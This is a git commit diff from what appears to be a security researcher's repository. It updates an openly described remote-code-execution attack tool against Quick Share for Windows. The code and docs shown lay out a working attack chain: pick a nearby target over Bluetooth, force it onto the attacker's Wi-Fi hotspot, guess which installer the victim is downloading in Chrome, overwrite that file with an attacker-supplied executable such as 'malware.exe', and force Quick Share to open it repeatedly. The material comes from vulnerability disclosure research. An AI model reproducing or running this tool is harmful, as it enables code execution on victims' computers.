c59a37f7f5384b37eef977d22fe163c2cd4ec0e5
Or Yair <or.yair@safebreach.com>
2024-08-10 04:57:19 +0300

    Updated quick shell to use argparse

--- docs/doc_quick_shell.md
+++ docs/doc_quick_shell.md
@@ -20,12 +20,12 @@ quick_shell.exe <AP_ssid> <AP_pass> <AP_ip> <AP_freq> <file_to_send_path> <popul
 * `AP_ssid`: the ssid of the access point.
 * `AP_pass`: the password required to connect to the access point.
 * `AP_ip`: the ip address of the access point.
-* `AP_freq`: the frequency of the access point (can be retrieved using tools like smartphones' wifi analyzers)
+* `AP_freq`: the frequency of the access point in Mhz (can be retrieved using tools like smartphones' wifi analyzers)
 * `file_to_send_path`: path to the file that will be sent to the victim.
 * `popular_files_yaml`: path to a YAML file that maps between domain paths and the executables that  can be downloaded from them. Follow the same format as present in [popular_files.yaml](/quick_shell_rce_tool/popular_files.yaml)
 
 ### Example of running quick_shell:
 ```
-quick_shell.exe testing_ap my_password 192.168.1.10 2701 malicous_installer.exe
+quick_shell.exe testing_ap my_password 192.168.137.1 2412 malware.exe ./popular_files.yaml
 ```
 
--- quick_shell_rce_tool/quick_shell.py
+++ quick_shell_rce_tool/quick_shell.py
@@ -1,4 +1,4 @@
-import sys
+import argparse
 import time
 import logging
 from quick_shell_rce_tool.downloadable_file import DownloadableFile
@@ -41,7 +41,7 @@ def pretty_print_ble_devices(quick_share_ble_devices):
 def run_choose_target_loop() -> QuickShareBleDevice:
     quick_share_ble_scanner = QuickShareBleScanner()
     quick_share_ble_scanner.start_background_scanning()
-    
+
     print("Scanning for Quick Share devices over BLE...")
     while True:
         print("Choose one of the following options:")
@@ -84,9 +84,23 @@ def get_target_ip_quick_share_wifi_lan_new_port(quick_share_wifi_lan_scanner: Qu
     return 0
 
 
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="An RCE attack chain tool against Quick Share for Windows. Capable of remotely overwriting executables of popular installers downloaded by Chrome on a Windows computer that has Quick Share")
+
+    parser.add_argument("AP_ssid", help="SSID of the attacker's Wi-Fi hotspot. There should be an active Wi-Fi hotspot on the same Windows computer that this tool runs on")
+    parser.add_argument("AP_pass", help="Password required to connect to the hotspot")
+    parser.add_argument("AP_ip", help="IP address of the hotspot's interface")
+    parser.add_argument("AP_freq", help="Frequency of the access point in Mhz")
+    parser.add_argument("file_to_send_path", help="Path to the file that will overwrite the victim's downloaded executables")
+    parser.add_argument("popular_files_yaml", help="Path to a YAML file mapping Domain Paths to popular executables and their sizes")
+
+    return parser.parse_args()
+
+
 def main():
     logging.basicConfig(level=logging.INFO)
-    domain_paths_to_files = parse_popular_files_yaml(sys.argv[6])
+    args = parse_arguments()
+    domain_paths_to_files = parse_popular_files_yaml(args.popular_files_yaml)
 
     target_bt_addr = run_choose_target_loop().bt_addr
 
@@ -95,7 +109,7 @@ def main():
     quick_share_wifi_lan_scanner.start_background_scanning()
 
     logging.info("Forcing target into connecting to our hotspot")
-    target_ip = force_wifi_connection_using_quick_share(target_bt_addr, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
+    target_ip = force_wifi_connection_using_quick_share(target_bt_addr, args.AP_ssid, args.AP_pass, args.AP_ip, args.AP_freq)
     if target_ip == None:
         logging.error("Could not connect target to our WiFi hotspot")
         return 0
@@ -150,10 +164,10 @@ def main():
         logging.info(f"Our guess for the file the victim is trying to download is: {guessed_file.name} ({guessed_file.size} Bytes)")
 
         logging.info("Sending the file before the download is finished")
-        send_file_with_bypass_using_quick_share("wifi_lan", target_ip, target_port, sys.argv[5], guessed_file.name.encode())
+        send_file_with_bypass_using_quick_share("wifi_lan", target_ip, target_port, args.file_to_send_path, guessed_file.name.encode())
         time.sleep(2) # The next send will not work if we will not wait a few seconds
         logging.info("Forcing victim's nearby share to continuously open the the file we sent")
-        force_quick_share_to_continuously_open_file("wifi_lan", target_ip, target_port, sys.argv[5], guessed_file.name.encode())
+        force_quick_share_to_continuously_open_file("wifi_lan", target_ip, target_port, args.file_to_send_path, guessed_file.name.encode())
 
         for packet in left_packets_queue:
             mitm_sniffer.send(packet)
